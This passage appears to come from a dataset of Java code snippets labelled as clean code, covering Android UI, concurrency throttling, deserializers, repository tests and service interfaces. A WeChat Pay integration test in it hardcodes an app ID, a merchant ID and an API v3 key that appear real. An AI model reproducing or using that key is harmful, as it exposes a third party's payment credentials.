    String s1=mText.substring(0,3);
    String s2=mText.substring(3);
    int textSize1=mTextSize * 2 / 3;
    paint.setTextSize(textSize1);
    float textWidth1=paint.measureText(s1,0,s1.length());
    paint.setTextSize(mTextSize);
    float textWidth2=paint.measureText(s2,0,s2.length());
    float textWidth=textWidth1 + textWidth2;
    RectF rect=new RectF(x,top,x + textWidth + mPadding * 2,bottom);
    paint.setColor(mBackgroundColor);
    canvas.drawRoundRect(rect,mCornerRadius,mCornerRadius,paint);
    paint.setColor(Color.WHITE);
    paint.setTextSize(textSize1);
    canvas.drawText(s1,0,3,x + mPadding,y,paint);
    paint.setTextSize(mTextSize);
    canvas.drawText(s2,0,s2.length(),x + mPadding + textWidth1,y,paint);
  }
}
",0,Clean Code
"/** 
 * Magic Number Constants
 */
public class MagicNumberConstants {
  public static final int INDEX_NEGATIVE_1=-1;
  public static final int INDEX_0=0;
  public static final int INDEX_1=1;
  public static final int INDEX_2=2;
  public static final int INDEX_3=3;
  public static final int INDEX_10=10;
  public static final int SIZE_4=4;
  public static final long LONG_5=5L;
}",0,Clean Code
"/** 
 * SnapshotThrottle with throughput threshold used in installSnapshot.
 * @author dennis
 */
public class ThroughputSnapshotThrottle implements SnapshotThrottle {
  private final long throttleThroughputBytes;
  private final long checkCycleSecs;
  private long lastThroughputCheckTimeUs;
  private long currThroughputBytes;
  private final Lock lock=new ReentrantLock();
  private final long baseAligningTimeUs;
  public ThroughputSnapshotThrottle(  final long throttleThroughputBytes,  final long checkCycleSecs){
    this.throttleThroughputBytes=throttleThroughputBytes;
    this.checkCycleSecs=checkCycleSecs;
    this.currThroughputBytes=0L;
    this.baseAligningTimeUs=1000 * 1000 / checkCycleSecs;
    this.lastThroughputCheckTimeUs=this.calculateCheckTimeUs(Utils.monotonicUs());
  }
  private long calculateCheckTimeUs(  final long currTimeUs){
    return currTimeUs / this.baseAligningTimeUs * this.baseAligningTimeUs;
  }
  @Override public long throttledByThroughput(  final long bytes){
    long availableSize;
    final long nowUs=Utils.monotonicUs();
    final long limitPerCycle=this.throttleThroughputBytes / this.checkCycleSecs;
    this.lock.lock();
    try {
      if (this.currThroughputBytes + bytes > limitPerCycle) {
        if (nowUs - this.lastThroughputCheckTimeUs <= 1000 * 1000 / this.checkCycleSecs) {
          availableSize=limitPerCycle - this.currThroughputBytes;
          this.currThroughputBytes=limitPerCycle;
        }
 else {
          availableSize=bytes > limitPerCycle ? limitPerCycle : bytes;
          this.currThroughputBytes=availableSize;
          this.lastThroughputCheckTimeUs=calculateCheckTimeUs(nowUs);
        }
      }
 else {
        availableSize=bytes;
        this.currThroughputBytes+=availableSize;
      }
    }
  finally {
      this.lock.unlock();
    }
    return availableSize;
  }
}",0,Clean Code
"static class DoubleFieldDeserializer extends FieldDeserializer {
  private final Field _field;
  DoubleFieldDeserializer(  Field field){
    _field=field;
  }
  void deserialize(  AbstractHessianInput in,  Object obj) throws IOException {
    double value=0;
    try {
      value=in.readDouble();
      _field.setDouble(obj,value);
    }
 catch (    Exception e) {
      logDeserializeError(_field,obj,value,e);
    }
  }
}
static class DoubleFieldDeserializer extends FieldDeserializer {
  private final Field _field;
  private final long _offset;
  DoubleFieldDeserializer(  Field field){
    _field=field;
    _offset=_unsafe.objectFieldOffset(_field);
  }
  @SuppressWarnings(""restriction"") void deserialize(  AbstractHessianInput in,  Object obj) throws IOException {
    double value=0;
    try {
      value=in.readDouble();
      _unsafe.putDouble(obj,_offset,value);
    }
 catch (    Exception e) {
      logDeserializeError(_field,obj,value,e);
    }
  }
}
",0,Clean Code
"/** 
 * @author james mu
 * @date 2019/8/10 下午4:50
 */
@Slf4j public class KeyBasedIntervalRegistry {
  private final Map<String,IntervalCount> hostCounts=new ConcurrentHashMap<>();
  private final long intervalDurationMs;
  private final long ttlMs;
  private final Set<String> whiteList;
  private final Set<String> blackList;
  public KeyBasedIntervalRegistry(  long intervalDurationMs,  long ttlMs,  String whiteList,  String blackList,  String name){
    this.intervalDurationMs=intervalDurationMs;
    this.ttlMs=ttlMs;
    this.whiteList=Sets.newHashSet(StringUtils.split(whiteList,','));
    this.blackList=Sets.newHashSet(StringUtils.split(blackList,','));
  }
  private void validate(  String name){
    if (ttlMs < intervalDurationMs) {
      log.warn(""TTL for {} IntervalRegistry [{}] smaller than interval duration [{}]"",name,ttlMs,intervalDurationMs);
    }
    log.info(""Start {} KeyBasedIntervalRegistry with whitelist {}"",name,whiteList);
    log.info(""Start {} KeyBasedIntervalRegistry with blacklist {}"",name,blackList);
  }
  public long tick(  String clientHostId){
    IntervalCount intervalCount=hostCounts.computeIfAbsent(clientHostId,s -> new IntervalCount(intervalDurationMs));
    long currentCount=intervalCount.resetIfExpiredAndTick();
    if (whiteList.contains(clientHostId)) {
      return 0;
    }
 else     if (blackList.contains(clientHostId)) {
      return Long.MAX_VALUE;
    }
    return currentCount;
  }
  public void clean(){
    hostCounts.entrySet().removeIf(entry -> entry.getValue().silenceDuration() > ttlMs);
  }
  public Map<String,Long> getContent(){
    return hostCounts.entrySet().stream().collect(Collectors.toMap(Map.Entry::getKey,interval -> interval.getValue().getCount()));
  }
}",0,Clean Code
"@KestraTest public abstract class AbstractMetricRepositoryTest {
  @Inject protected MetricRepositoryInterface metricRepository;
  @Test void all(){
    String executionId=FriendlyId.createFriendlyId();
    TaskRun taskRun1=taskRun(executionId,""task"");
    MetricEntry counter=MetricEntry.of(taskRun1,counter(""counter""));
    TaskRun taskRun2=taskRun(executionId,""task"");
    MetricEntry timer=MetricEntry.of(taskRun2,timer());
    metricRepository.save(counter);
    metricRepository.save(timer);
    List<MetricEntry> results=metricRepository.findByExecutionId(null,executionId,Pageable.from(1,10));
    assertThat(results.size(),is(2));
    results=metricRepository.findByExecutionIdAndTaskId(null,executionId,taskRun1.getTaskId(),Pageable.from(1,10));
    assertThat(results.size(),is(2));
    results=metricRepository.findByExecutionIdAndTaskRunId(null,executionId,taskRun1.getId(),Pageable.from(1,10));
    assertThat(results.size(),is(1));
    MetricAggregations aggregationResults=metricRepository.aggregateByFlowId(null,""namespace"",""flow"",null,counter.getName(),ZonedDateTime.now().minusDays(30),ZonedDateTime.now(),""sum"");
    assertThat(aggregationResults.getAggregations().size(),is(31));
    assertThat(aggregationResults.getGroupBy(),is(""day""));
    aggregationResults=metricRepository.aggregateByFlowId(null,""namespace"",""flow"",null,counter.getName(),ZonedDateTime.now().minusWeeks(26),ZonedDateTime.now(),""sum"");
    assertThat(aggregationResults.getAggregations().size(),is(27));
    assertThat(aggregationResults.getGroupBy(),is(""week""));
  }
  @Test void names(){
    String executionId=FriendlyId.createFriendlyId();
    TaskRun taskRun1=taskRun(executionId,""task"");
    MetricEntry counter=MetricEntry.of(taskRun1,counter(""counter""));
    TaskRun taskRun2=taskRun(executionId,""task2"");
    MetricEntry counter2=MetricEntry.of(taskRun2,counter(""counter2""));
    metricRepository.save(counter);
    metricRepository.save(counter2);
    List<String> flowMetricsNames=metricRepository.flowMetrics(null,""namespace"",""flow"");
    List<String> taskMetricsNames=metricRepository.taskMetrics(null,""namespace"",""flow"",""task"");
    List<String> tasksWithMetrics=metricRepository.tasksWithMetrics(null,""namespace"",""flow"");
    assertThat(flowMetricsNames.size(),is(2));
    assertThat(taskMetricsNames.size(),is(1));
    assertThat(tasksWithMetrics.size(),is(2));
  }
  private Counter counter(  String metricName){
    return Counter.of(metricName,1);
  }
  private Timer timer(){
    return Timer.of(""counter"",Duration.ofSeconds(5));
  }
  private TaskRun taskRun(  String executionId,  String taskId){
    return TaskRun.builder().flowId(""flow"").namespace(""namespace"").executionId(executionId).taskId(taskId).id(FriendlyId.createFriendlyId()).build();
  }
}
",0,Clean Code
"public class SidebarCommand extends Command {
  private final Sidebar sidebar=new Sidebar(Component.text(""DEMO"").decorate(TextDecoration.BOLD));
  private int currentLine=0;
  public SidebarCommand(){
    super(""sidebar"");
    addLine(""BLANK "",Sidebar.NumberFormat.blank());
    addLine(""STYLE "",Sidebar.NumberFormat.styled(Component.empty().decorate(TextDecoration.STRIKETHROUGH).color(NamedTextColor.GRAY)));
    addLine(""FIXED "",Sidebar.NumberFormat.fixed(Component.text(""FIXED"").color(NamedTextColor.GRAY)));
    addLine(""NULL "",null);
    setDefaultExecutor((source,args) -> source.sendMessage(Component.text(""Unknown syntax (note: title must be quoted)"")));
    setCondition(Conditions::playerOnly);
    var option=ArgumentType.Word(""option"").from(""add-line"",""remove-line"",""set-title"",""toggle"",""update-content"",""update-score"");
    var content=ArgumentType.String(""content"").setDefaultValue("""");
    var targetLine=ArgumentType.Integer(""target line"").setDefaultValue(-1);
    addSyntax(this::handleSidebar,option);
    addSyntax(this::handleSidebar,option,content);
    addSyntax(this::handleSidebar,option,content,targetLine);
  }
  private void handleSidebar(  CommandSender source,  CommandContext context){
    Player player=(Player)source;
    String option=context.get(""option"");
    String content=context.get(""content"");
    int targetLine=context.get(""target line"");
    if (targetLine == -1)     targetLine=currentLine;
switch (option) {
case ""add-line"":
      addLine(content,null);
    break;
case ""remove-line"":
  removeLine();
break;
case ""set-title"":
setTitle(content);
break;
case ""toggle"":
toggleSidebar(player);
break;
case ""update-content"":
updateLineContent(content,String.valueOf(targetLine));
break;
case ""update-score"":
updateLineScore(Integer.parseInt(content),String.valueOf(targetLine));
break;
}
}
private void addLine(@NotNull String content,@Nullable Sidebar.NumberFormat numberFormat){
if (currentLine < 16) {
sidebar.createLine(new Sidebar.ScoreboardLine(String.valueOf(currentLine),Component.text(content).color(NamedTextColor.WHITE),currentLine,numberFormat));
currentLine++;
}
}
private void removeLine(){
if (currentLine > 0) {
sidebar.removeLine(String.valueOf(currentLine));
currentLine--;
}
}
private void setTitle(@NotNull String title){
sidebar.setTitle(Component.text(title).decorate(TextDecoration.BOLD));
}
private void toggleSidebar(Player player){
if (sidebar.getViewers().contains(player)) sidebar.removeViewer(player);
 else sidebar.addViewer(player);
}
private void updateLineContent(@NotNull String content,@NotNull String lineId){
sidebar.updateLineContent(lineId,Component.text(content).color(NamedTextColor.WHITE));
}
private void updateLineScore(int score,@NotNull String lineId){
sidebar.updateLineScore(lineId,score);
}
}
",0,Clean Code
"/** 
 * @author shuzijun
 */
public class DonateListener implements ActionListener {
  private JCheckBox jcb;
  public DonateListener(  JCheckBox jcb){
    this.jcb=jcb;
  }
  @Override public void actionPerformed(  ActionEvent e){
    if (jcb.isSelected()) {
      Project project=ProjectManager.getInstance().getDefaultProject();
      DonateListener.DonatePanel dialog=new DonateListener.DonatePanel(project);
      dialog.setTitle(PropertiesUtils.getInfo(""donate.info""));
      dialog.showAndGet();
    }
  }
private class DonatePanel extends DialogWrapper {
    private JPanel jpanel;
    public DonatePanel(    @Nullable Project project){
      super(project,true);
      jpanel=new JPanel();
      try {
        jpanel.add(new JLabel(new ImageIcon(ImageIO.read(this.getClass().getClassLoader().getResourceAsStream(""image/WeChat.png"")))));
        jpanel.add(new JLabel(new ImageIcon(ImageIO.read(this.getClass().getClassLoader().getResourceAsStream(""image/AliPay.png"")))));
      }
 catch (      IOException e) {
        LogUtils.LOG.error(""加载图片失败"",e);
      }
      jpanel.setMinimumSize(new Dimension(400,200));
      setModal(true);
      init();
    }
    @Nullable @Override protected JComponent createCenterPanel(){
      return jpanel;
    }
  }
}
",0,Clean Code
"public class HighContrastBorder extends Drawable {
  private final Paint mPaint;
  public HighContrastBorder(){
    mPaint=new Paint();
  }
  public Paint getPaint(){
    return mPaint;
  }
  @Override public void draw(  Canvas canvas){
    int w=getBounds().width();
    int h=getBounds().height();
    mPaint.setStrokeWidth(0);
    mPaint.setAntiAlias(false);
    mPaint.setColor(Color.WHITE);
    canvas.drawLine(0.5f,0.5f,w - 1.5f,0.5f,mPaint);
    mPaint.setColor(Color.BLACK);
    canvas.drawLine(1.5f,1.5f,w - 0.5f,1.5f,mPaint);
    mPaint.setColor(Color.WHITE);
    canvas.drawLine(0.5f,0.5f,0.5f,h - 1.5f,mPaint);
    mPaint.setColor(Color.BLACK);
    canvas.drawLine(1.5f,1.5f,1.5f,h - 0.5f,mPaint);
    mPaint.setColor(Color.WHITE);
    canvas.drawLine(w - 1.5f,0.5f,w - 1.5f,h - 1.5f,mPaint);
    mPaint.setColor(Color.BLACK);
    canvas.drawLine(w - 0.5f,1.5f,w - 0.5f,h - 0.5f,mPaint);
    mPaint.setColor(Color.WHITE);
    canvas.drawLine(0.5f,h - 1.5f,w - 1.5f,h - 1.5f,mPaint);
    mPaint.setColor(Color.BLACK);
    canvas.drawLine(1.5f,h - 0.5f,w - 0.5f,h - 0.5f,mPaint);
  }
  @Override public void setAlpha(  int alpha){
  }
  @Override public void setColorFilter(  ColorFilter colorFilter){
  }
  @Override @SuppressWarnings(""deprecation"") public int getOpacity(){
    return android.graphics.PixelFormat.TRANSLUCENT;
  }
}
",0,Clean Code
"/** 
 * {@link WxNativePayClient} 的集成测试，用于快速调试微信扫码支付
 * @author 芋道源码
 */
@Disabled public class WxNativePayClientIntegrationTest {
  @Test public void testPayV3() throws WxPayException {
    WxPayConfig config=buildWxPayConfigV3();
    WxPayService client=new WxPayServiceImpl();
    client.setConfig(config);
    WxPayUnifiedOrderV3Request request=new WxPayUnifiedOrderV3Request().setOutTradeNo(String.valueOf(System.currentTimeMillis())).setDescription(""测试支付-body"").setAmount(new WxPayUnifiedOrderV3Request.Amount().setTotal(1)).setTimeExpire(formatDateV3(LocalDateTimeUtils.addTime(Duration.ofMinutes(2)))).setSceneInfo(new WxPayUnifiedOrderV3Request.SceneInfo().setPayerClientIp(""127.0.0.1"")).setNotifyUrl(""http://127.0.0.1:48080"");
    System.out.println(""========= request =========="");
    System.out.println(JsonUtils.toJsonPrettyString(request));
    String response=client.createOrderV3(TradeTypeEnum.NATIVE,request);
    System.out.println(""========= response =========="");
    System.out.println(JsonUtils.toJsonPrettyString(response));
  }
  @Test public void testRefundV3() throws WxPayException {
    WxPayConfig config=buildWxPayConfigV3();
    WxPayService client=new WxPayServiceImpl();
    client.setConfig(config);
    WxPayRefundV3Request request=new WxPayRefundV3Request().setOutTradeNo(""1689545729695"").setOutRefundNo(String.valueOf(System.currentTimeMillis())).setAmount(new WxPayRefundV3Request.Amount().setTotal(1).setRefund(1).setCurrency(""CNY"")).setReason(""就是想退了"");
    System.out.println(""========= request =========="");
    System.out.println(JsonUtils.toJsonPrettyString(request));
    WxPayRefundV3Result response=client.refundV3(request);
    System.out.println(""========= response =========="");
    System.out.println(JsonUtils.toJsonPrettyString(response));
  }
  private WxPayConfig buildWxPayConfigV3(){
    WxPayConfig config=new WxPayConfig();
    config.setAppId(""wx62056c0d5e8db250"");
    config.setMchId(""1545083881"");
    config.setApiV3Key(""459arNsYHl1mgkiO6H9ZH5KkhFXSxaA4"");
    config.setPrivateCertPath(""/Users/yunai/Downloads/wx_pay/apiclient_cert.pem"");
    config.setPrivateKeyPath(""/Users/yunai/Downloads/wx_pay/apiclient_key.pem"");
    return config;
  }
}
",0,Clean Code
"/** 
 * 岗位 Service 接口
 * @author 芋道源码
 */
public interface PostService {
  /** 
 * 创建岗位
 * @param createReqVO 岗位信息
 * @return 岗位编号
 */
  Long createPost(  PostSaveReqVO createReqVO);
  /** 
 * 更新岗位
 * @param updateReqVO 岗位信息
 */
  void updatePost(  PostSaveReqVO updateReqVO);
  /** 
 * 删除岗位信息
 * @param id 岗位编号
 */
  void deletePost(  Long id);
  /** 
 * 获得岗位列表
 * @param ids 岗位编号数组
 * @return 部门列表
 */
  List<PostDO> getPostList(  @Nullable Collection<Long> ids);
  /** 
 * 获得符合条件的岗位列表
 * @param ids 岗位编号数组。如果为空，不进行筛选
 * @param statuses 状态数组。如果为空，不进行筛选
 * @return 部门列表
 */
  List<PostDO> getPostList(  @Nullable Collection<Long> ids,  @Nullable Collection<Integer> statuses);
  /** 
 * 获得岗位分页列表
 * @param reqVO 分页条件
 * @return 部门分页列表
 */
  PageResult<PostDO> getPostPage(  PostPageReqVO reqVO);
  /** 
 * 获得岗位信息
 * @param id 岗位编号
 * @return 岗位信息
 */
  PostDO getPost(  Long id);
  /** 
 * 校验岗位们是否有效。如下情况，视为无效： 1. 岗位编号不存在 2. 岗位被禁用
 * @param ids 岗位编号数组
 */
  void validatePostList(  Collection<Long> ids);
}
",0,Clean Code
"public class ProfileMinimalistFragment extends Fragment {
  private View mBaseView;
  private ProfileMinamalistLayout mProfileLayout;
  @Nullable @Override public View onCreateView(  LayoutInflater inflater,  @Nullable ViewGroup container,  Bundle savedInstanceState){
    mBaseView=inflater.inflate(R.layout.minimalist_profile_fragment,container,false);
    initView();
    return mBaseView;
  }
  private void initView(){
    mProfileLayout=mBaseView.findViewById(R.id.profile_view);
    mProfileLayout.setOnClickListener(new OnClickListener(){
      @Override public void finishActivity(){
        getActivity().finish();
      }
    }
);
    mBaseView.findViewById(R.id.logout_btn).setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View v){
        new TUIKitDialog(getActivity()).builder().setCancelable(true).setCancelOutside(true).setTitle(getString(R.string.logout_tip)).setDialogWidth(0.75f).setPositiveButton(getString(com.tencent.qcloud.tuicore.R.string.sure),new View.OnClickListener(){
          @Override public void onClick(          View v){
            TUILogin.logout(new TUICallback(){
              @Override public void onSuccess(){
                ProfileUtil.onLogoutSuccess(getActivity());
              }
              @Override public void onError(              int code,              String desc){
                ToastUtil.toastLongMessage(""logout fail: "" + code + ""=""+ desc);
              }
            }
);
          }
        }
).setNegativeButton(getString(com.tencent.qcloud.tuicore.R.string.cancel),new View.OnClickListener(){
          @Override public void onClick(          View v){
          }
        }
).show();
      }
    }
);
  }
  @Override public void onResume(){
    super.onResume();
    mProfileLayout.initUI();
  }
  public void reloadData(){
    if (mProfileLayout != null) {
      mProfileLayout.loadSelfInfo();
    }
  }
public interface OnClickListener {
    void finishActivity();
  }
}
",0,Clean Code
"/** 
 * service registry /xxl-rpc/dev/ - key01(service01) - value01 (ip:port01) - value02 (ip:port02)
 * @author xuxueli 2018-10-17
 */
public abstract class ServiceRegistry {
  /** 
 * start
 */
  public abstract void start(  Map<String,String> param);
  /** 
 * start
 */
  public abstract void stop();
  /** 
 * registry service, for mult
 * @param keys      service key
 * @param value     service value/ip:port
 * @return
 */
  public abstract boolean registry(  Set<String> keys,  String value);
  /** 
 * remove service, for mult
 * @param keys
 * @param value
 * @return
 */
  public abstract boolean remove(  Set<String> keys,  String value);
  /** 
 * discovery services, for mult
 * @param keys
 * @return
 */
  public abstract Map<String,TreeSet<String>> discovery(  Set<String> keys);
  /** 
 * discovery service, for one
 * @param key   service key
 * @return      service value/ip:port
 */
  public abstract TreeSet<String> discovery(  String key);
}
",0,Clean Code
"/** 
 * Represents a node in the Ast for a parsed expression.
 * @author Andy Clement
 * @since 3.0
 */
interface SpelNode {
  /** 
 * Evaluate the expression node in the context of the supplied expression state and return the value.
 * @param expressionState the current expression state (includes the context)
 * @return the value of this node evaluated against the specified state
 */
  Object getValue(  ExpressionState expressionState) throws EvaluationException ;
  /** 
 * Evaluate the expression node in the context of the supplied expression state and return the typed value.
 * @param expressionState the current expression state (includes the context)
 * @return the type value of this node evaluated against the specified state
 */
  TypedValue getTypedValue(  ExpressionState expressionState) throws EvaluationException ;
  /** 
 * Determine if this expression node will support a setValue() call.
 * @param expressionState the current expression state (includes the context)
 * @return true if the expression node will allow setValue()
 * @throws EvaluationException if something went wrong trying to determineif the node supports writing
 */
  boolean isWritable(  ExpressionState expressionState) throws EvaluationException ;
  /** 
 * Evaluate the expression to a node and then set the new value on that node. For example, if the expression evaluates to a property reference, then the property will be set to the new value.
 * @param expressionState the current expression state (includes the context)
 * @param newValue        the new value
 * @throws EvaluationException if any problem occurs evaluating the expression orsetting the new value
 */
  void setValue(  ExpressionState expressionState,  Object newValue) throws EvaluationException ;
  /** 
 * @return the string form of this AST node
 */
  String toStringAST();
  /** 
 * @return the number of children under this node
 */
  int getChildCount();
  /** 
 * Helper method that returns a SpelNode rather than an Antlr Tree node.
 * @return the child node cast to a SpelNode
 */
  SpelNode getChild(  int index);
  /** 
 * Determine the class of the object passed in, unless it is already a class object.
 * @param obj the object that the caller wants the class of
 * @return the class of the object if it is not already a class object,or  {@code null} if the object is {@code null}
 */
  Class<?> getObjectClass(  Object obj);
  /** 
 * @return the start position of this Ast node in the expression string
 */
  int getStartPosition();
  /** 
 * @return the end position of this Ast node in the expression string
 */
  int getEndPosition();
}
",0,Clean Code
"/** 
 * <p> 系统参数配置信息表 实体VO </p>
 * @author AllDataDC
 * @since 2023-01-19
 */
@Data public class ConfigVo implements Serializable {
  private static final long serialVersionUID=1L;
  private String id;
  private String status;
  @JsonFormat(pattern=""yyyy-MM-dd HH:mm:ss"",timezone=""GMT+8"") private LocalDateTime createTime;
  private String remark;
  private String configName;
  private String configKey;
  private String configValue;
}
/** 
 * <p> 系统参数配置信息表 实体VO </p>
 * @author yuwei
 * @date 2022-05-19
 */
@Data public class ConfigVo implements Serializable {
  private static final long serialVersionUID=1L;
  private String id;
  private String status;
  @JsonFormat(pattern=""yyyy-MM-dd HH:mm:ss"",timezone=""GMT+8"") private LocalDateTime createTime;
  private String remark;
  private String configName;
  private String configKey;
  private String configValue;
}",0,Clean Code
"/** 
 * Desc: Created by zhisheng on 2019/10/27 下午1:59 blog：http://www.54tianzhisheng.cn/ 微信公众号：zhisheng
 */
public class OriLog2LogEventFlatMapFunction extends RichFlatMapFunction<OriginalLogEvent,LogEvent> {
  @Override public void flatMap(  OriginalLogEvent originalLogEvent,  Collector<LogEvent> collector) throws Exception {
    if (originalLogEvent == null) {
      return;
    }
    LogEvent logEvent=new LogEvent();
    String source=originalLogEvent.getSource();
    if (source.contains(""middleware"")) {
      logEvent.setType(""MIDDLEWARE"");
    }
 else     if (source.contains(""app"")) {
      logEvent.setType(""APP"");
    }
 else     if (source.contains(""docker"")) {
      logEvent.setType(""DOCKER"");
    }
 else {
      logEvent.setType(""MACHINE"");
    }
    logEvent.setMessage(originalLogEvent.getMessage());
    Map<String,Object> messageMap=GrokUtil.toMap(""%{KAFKALOG}"",originalLogEvent.getMessage());
    logEvent.setTimestamp(DateUtil.format(messageMap.get(""timestamp"").toString(),YYYY_MM_DD_HH_MM_SS));
    logEvent.setLevel(messageMap.get(""level"").toString());
    Map<String,String> tags=new HashMap<>();
    tags.put(""host_name"",originalLogEvent.getHost().get(""name""));
    tags.put(""kafka_tpoic"",originalLogEvent.getMetadata().get(""topic""));
    tags.put(""source"",originalLogEvent.getSource());
    logEvent.setTags(tags);
    collector.collect(logEvent);
  }
}
",0,Clean Code
"@Service class PersonService {
  private final AtomicLong counter=new AtomicLong();
  private final Set<Person> people=Stream.of(new Person(counter.incrementAndGet(),""Jane""),new Person(counter.incrementAndGet(),""Josh""),new Person(counter.incrementAndGet(),""Gordon"")).collect(Collectors.toCollection(HashSet::new));
  Person save(  Person p){
    Person person=new Person(counter.incrementAndGet(),p.getName());
    this.people.add(person);
    return person;
  }
  Set<Person> all(){
    return this.people;
  }
  Person byId(  @Parameter(in=ParameterIn.PATH) Long id){
    return this.people.stream().filter(p -> p.getId().equals(id)).findFirst().orElseThrow(() -> new IllegalArgumentException(""no "" + Person.class.getName() + "" with that ID found!""));
  }
}
/** 
 * The type Person service.
 */
@Service class PersonService {
  /** 
 * The Counter.
 */
  private final AtomicLong counter=new AtomicLong();
  /** 
 * The People.
 */
  private final Set<Person> people=Stream.of(new Person(counter.incrementAndGet(),""Jane""),new Person(counter.incrementAndGet(),""Josh""),new Person(counter.incrementAndGet(),""Gordon"")).collect(Collectors.toCollection(HashSet::new));
  /** 
 * Save person.
 * @param p the p 
 * @return the person
 */
  Person save(  Person p){
    Person person=new Person(counter.incrementAndGet(),p.getName());
    this.people.add(person);
    return person;
  }
  /** 
 * All set.
 * @return the set
 */
  Set<Person> all(){
    return this.people;
  }
  /** 
 * By id person.
 * @param id the id 
 * @return the person
 */
  Person byId(  @Parameter(in=ParameterIn.PATH) Long id){
    return this.people.stream().filter(p -> p.getId().equals(id)).findFirst().orElseThrow(() -> new IllegalArgumentException(""no "" + Person.class.getName() + "" with that ID found!""));
  }
}
",0,Clean Code
"public class LinkTextViewMovementMethod extends LinkMovementMethod {
  private long mLastActionDownTime;
  private LinkClickListener mListener;
  public LinkTextViewMovementMethod(  LinkClickListener listener){
    mListener=listener;
  }
  @Override public boolean onTouchEvent(  TextView widget,  Spannable buffer,  MotionEvent event){
    int action=event.getAction();
    if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_DOWN) {
      int x=(int)event.getX();
      int y=(int)event.getY();
      x-=widget.getTotalPaddingLeft();
      y-=widget.getTotalPaddingTop();
      x+=widget.getScrollX();
      y+=widget.getScrollY();
      Layout layout=widget.getLayout();
      int line=layout.getLineForVertical(y);
      int off=layout.getOffsetForHorizontal(line,x);
      ClickableSpan[] link=buffer.getSpans(off,off,ClickableSpan.class);
      if (link.length != 0) {
        if (action == MotionEvent.ACTION_UP) {
          long actionUpTime=System.currentTimeMillis();
          if (actionUpTime - mLastActionDownTime > ViewConfiguration.getLongPressTimeout()) {
            return true;
          }
          String url=null;
          if (link[0] instanceof URLSpan)           url=((URLSpan)link[0]).getURL();
          if (mListener != null && mListener.onLinkClick(url))           return true;
 else           link[0].onClick(widget);
        }
 else         if (action == MotionEvent.ACTION_DOWN) {
          mLastActionDownTime=System.currentTimeMillis();
        }
        return true;
      }
 else {
        Touch.onTouchEvent(widget,buffer,event);
        return false;
      }
    }
    return Touch.onTouchEvent(widget,buffer,event);
  }
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public final class ExecutorServiceHelper {
  private static final Logger LOG=LoggerFactory.getLogger(ExecutorServiceHelper.class);
  /** 
 * @see #shutdownAndAwaitTermination(ExecutorService,long)
 */
  public static boolean shutdownAndAwaitTermination(  final ExecutorService pool){
    return shutdownAndAwaitTermination(pool,1000);
  }
  /** 
 * The following method shuts down an  {@code ExecutorService} in twophases, first by calling  {@code shutdown} to reject incoming tasks,and then calling  {@code shutdownNow}, if necessary, to cancel any lingering tasks.
 */
  public static boolean shutdownAndAwaitTermination(  final ExecutorService pool,  final long timeoutMillis){
    if (pool == null) {
      return true;
    }
    pool.shutdown();
    final TimeUnit unit=TimeUnit.MILLISECONDS;
    final long phaseOne=timeoutMillis / 5;
    try {
      if (pool.awaitTermination(phaseOne,unit)) {
        return true;
      }
      pool.shutdownNow();
      if (pool.awaitTermination(timeoutMillis - phaseOne,unit)) {
        return true;
      }
      LOG.warn(""Fail to shutdown pool: {}."",pool);
    }
 catch (    final InterruptedException e) {
      pool.shutdownNow();
      Thread.currentThread().interrupt();
    }
    return false;
  }
}",0,Clean Code
"public class PickGroupMemberBlackFragment extends PickGroupMemberFragment {
  private static final int SPAN=5;
  public static PickGroupMemberBlackFragment newInstance(  GroupInfo groupInfo){
    Bundle args=new Bundle();
    args.putParcelable(""groupInfo"",groupInfo);
    PickGroupMemberBlackFragment fragment=new PickGroupMemberBlackFragment();
    fragment.setArguments(args);
    return fragment;
  }
  @Override public int getContentLayoutResId(){
    return R.layout.contact_pick_fragment_black;
  }
  @Override public UserListAdapter onCreateUserListAdapter(){
    return new CheckableUserListBlackAdapter(this);
  }
  @Override protected void configPickedUserRecyclerView(){
    RecyclerView.LayoutManager pickedContactRecyclerViewLayoutManager=new GridLayoutManager(getActivity(),SPAN);
    pickedUserRecyclerView.setLayoutManager(pickedContactRecyclerViewLayoutManager);
    int space=(UIUtils.getDisplayWidth(getContext()) - SPAN * UIUtils.dip2Px(52) - 2 * UIUtils.dip2Px(16)) / (SPAN - 1);
    pickedUserRecyclerView.addItemDecoration(new Decoration(space));
  }
  @Override protected PickedUserAdapter getPickedUserAdapter(){
    return new PickedUserBlackAdapter(pickUserViewModel);
  }
  @Override protected void handleHintView(  boolean focus){
    if (focus) {
      hintView.setVisibility(View.GONE);
    }
 else {
      hintView.setVisibility(View.VISIBLE);
    }
  }
  @Override protected void handleEditText(){
  }
private static class Decoration extends RecyclerView.ItemDecoration {
    private int space;
    public Decoration(    int space){
      this.space=space;
    }
    @Override public void getItemOffsets(    @NonNull Rect outRect,    @NonNull View view,    @NonNull RecyclerView parent,    @NonNull RecyclerView.State state){
      int position=parent.getChildAdapterPosition(view);
      int column=position % SPAN;
      if (column < SPAN - 1) {
        outRect.right=space;
      }
 else {
        outRect.right=0;
      }
      outRect.bottom=UIUtils.dip2Px(10);
    }
  }
}
",0,Clean Code
"public class CheckableImageView extends AppCompatImageView implements Checkable {
  private boolean mChecked=false;
  private int mCheckMarkBackgroundColor;
  private CheckableFlipDrawable mDrawable;
  public CheckableImageView(  Context context){
    super(context);
    init(context,null);
  }
  public CheckableImageView(  Context context,  AttributeSet attrs){
    super(context,attrs);
    init(context,attrs);
  }
  public CheckableImageView(  Context context,  AttributeSet attrs,  int defStyleAttr){
    super(context,attrs,defStyleAttr);
    init(context,attrs);
  }
  private void init(  Context context,  AttributeSet attrs){
    setCheckMarkBackgroundColor(context.getResources().getColor(R.color.def_checked_mark_background_color));
  }
  public void setCheckMarkBackgroundColor(  int color){
    mCheckMarkBackgroundColor=color;
    if (mDrawable != null) {
      mDrawable.setCheckMarkBackgroundColor(color);
    }
  }
  public void toggle(){
    setChecked(!mChecked);
  }
  @Override public boolean isChecked(){
    return mChecked;
  }
  @Override public void setChecked(  boolean checked){
    setChecked(checked,true);
  }
  public void setChecked(  boolean checked,  boolean animate){
    if (mChecked == checked) {
      return;
    }
    mChecked=checked;
    applyCheckState(animate);
  }
  @Override public void setImageDrawable(  Drawable d){
    if (d != null) {
      if (mDrawable == null) {
        mDrawable=new CheckableFlipDrawable(getContext(),d,mCheckMarkBackgroundColor,150);
        applyCheckState(false);
      }
 else {
        mDrawable.setFront(d);
      }
      d=mDrawable;
    }
    super.setImageDrawable(d);
